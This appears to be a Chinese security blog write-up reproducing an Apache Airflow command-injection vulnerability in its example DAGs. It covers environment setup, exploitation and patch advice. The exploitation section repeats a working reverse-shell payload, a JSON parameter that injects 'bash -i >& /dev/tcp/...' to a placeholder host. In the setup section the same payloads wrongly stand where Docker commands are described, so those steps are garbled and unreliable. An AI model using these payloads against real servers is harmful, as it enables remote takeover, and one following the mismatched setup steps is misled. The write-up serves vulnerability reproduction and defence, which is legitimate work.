<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/eEvADelFTk5OX07eGo8XLw)

**上方蓝色字体关注我们，一起学安全！**

**作者：****bnlbnf****@Timeline Sec  
**

**本文字数：764**

**阅读时长：2～3min**

**声明：仅供学习参考使用，请勿用作违法用途，否则后果自负**

**0x01 简介**  

  

Apache Airflow 是美国阿帕奇（Apache）基金会的一套用于创建、管理和监控工作流程的开源平台。该平台具有可扩展和动态监控等特点。  

**0x02 漏洞概述**  

  

Apache Airflow 存在操作系统命令注入漏洞，该漏洞的存在是由于某些示例 dag 中不正确的输入验证。远程未经身份验证的攻击者可利用该漏洞可以传递专门制作的 HTTP 请求，并在目标系统上执行任意操作系统命令。该漏洞允许远程攻击者可利用该漏洞在目标系统上执行任意 shell 命令。  

**0x03 影响版本**  

  

Apache Airflow < 2.2.4  

**0x04 环境搭建**  

  

使用 docker 搭建存在漏洞的系统版本  

获取 yaml 文档

```
curl -LfO 'https://airflow.apache.org/docs/apache-airflow/2.2.3/docker-compose.yaml'
```

```
mkdir -p ./dags ./logs ./plugins
echo -e "AIRFLOW_UID=$(id -u)" > .env
```

把这两个参数改成下面的，选择 postgres 的 latest 版本，privileged=true 就是提升权限

```
docker-compose -f docker-compose.yaml up -d
```

privileged: true(没有就加一个)

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjXNdmLFx6icYIvLiaQzZ1XW9ZniblwxoMpon9ibE7N5bevKRPoibDgayx1DFChfsEwTz2sRqFic5Bbg7Yg/640?wx_fmt=png)

然后 wq 保存

在这里你用 docker-compose config -q 会有一个警告的，为了不报这个警告官网也推荐了以下这个方式

```
{"foo":"\";bash -i >& /dev/tcp/xx.xx.xx.xx/8881 0>&1;\""}
```

直接执行即可

初始化

docker-compose up airflow-init

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjXNdmLFx6icYIvLiaQzZ1XW9FZGv970bT8ib5QpFWspjf0Nctfw6LCsBeASuNlatxhM94HZ5wmyqbLg/640?wx_fmt=png)

docker-compose 后台启动 airflow

```
{"my_param":"\";bash -i >& /dev/tcp/xx.xx.xx.xx/8881 0>&1;\""}
```

启动完成，浏览器打开 ip:8080 端口

用户名：airflow

密码：airflow  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjXNdmLFx6icYIvLiaQzZ1XW9WYmSLXibrKMXu3ia2PjZAglugcSxicwB3ubcDQhgJvvn5gw83vN5XHbsA/640?wx_fmt=png)

登陆，环境搭建完成  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjXNdmLFx6icYIvLiaQzZ1XW9CUhoic2zN5Up85hXIicHpSBP4suia2h5y06Op5trn98lZKbNHFvbEeqdQ/640?wx_fmt=png)

**0x05 漏洞复现**  

  

参考漏洞提交者的文章

https://hackerone.com/reports/1492896

两处 RCE 均为后台漏洞（需要配合未授权或者默认口令漏洞进行利用）

**第一处：**

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjXNdmLFx6icYIvLiaQzZ1XW95MKibAaczqIwrR74hpcaWYQEFwgGzDxyQgMb5klt3dJ9N9dSWeX7MgQ/640?wx_fmt=png)

开启监听  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjXNdmLFx6icYIvLiaQzZ1XW946B7XvR3PTMMpJjb9OYnzGncPUKScHuQKsQNIhaAtoTyyuh0jmUmXQ/640?wx_fmt=png)

反弹 shell

```
{"foo":"\";bash -i >& /dev/tcp/xx.xx.xx.xx/8881 0>&1;\""}
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjXNdmLFx6icYIvLiaQzZ1XW9ja7M5WuNSmLqHoIU3Y8XzNraHwRiacZztM4uYmubXaQsxkmGXvdibARA/640?wx_fmt=png)

反弹成功

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjXNdmLFx6icYIvLiaQzZ1XW9GCO4vIHiaOkJonYMuj5YoeiaVbicznicSGIW4HHUjr8AoLkicAMtoeeoGVw/640?wx_fmt=png)  

**第二处:**  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjXNdmLFx6icYIvLiaQzZ1XW9TAogIPLQicG5ZSPSAqQ0mNxy2vhmrkWWOQrbiaA9ImQYVc8zrvSaXfPA/640?wx_fmt=png)

开启监听

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjXNdmLFx6icYIvLiaQzZ1XW946B7XvR3PTMMpJjb9OYnzGncPUKScHuQKsQNIhaAtoTyyuh0jmUmXQ/640?wx_fmt=png)

```
{"my_param":"\";bash -i >& /dev/tcp/xx.xx.xx.xx/8881 0>&1;\""}
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjXNdmLFx6icYIvLiaQzZ1XW9BEVfxBt1vDaDy3XJJuMZDt1DdbRJBITW6JuygW0yO8cz6CtrfEfJJg/640?wx_fmt=png)

反弹成功  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjXNdmLFx6icYIvLiaQzZ1XW9Y6WcS1NeibjxnkJxufHowtupXIxnJ9CMOfD1QU9lsgBtplGnpAazC2Q/640?wx_fmt=png)

**0x06 修复方式**  

  

1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

http://seclists.org/oss-sec/2022/q1/160

2、删除或禁用默认 DAG（可自行删除或在配置文件中禁用默认 DAGload_examples=False）

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaASAShFz46a4AgLIIYWJQKpGAnMJxQ4dugNhW5W8ia0SwhReTlse0vygkJ209LibhNVd93fGib77pNQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVshAoU3O2dkDTzN0sqCMBceq8o0lxjLtkWHanicxqtoZPFuchn87MgA603GrkicrIhB2IKxjmQicb6KTQ/640?wx_fmt=jpeg)

**阅读原文看更多复现文章**

Timeline Sec 团队  

安全路上，与你并肩前行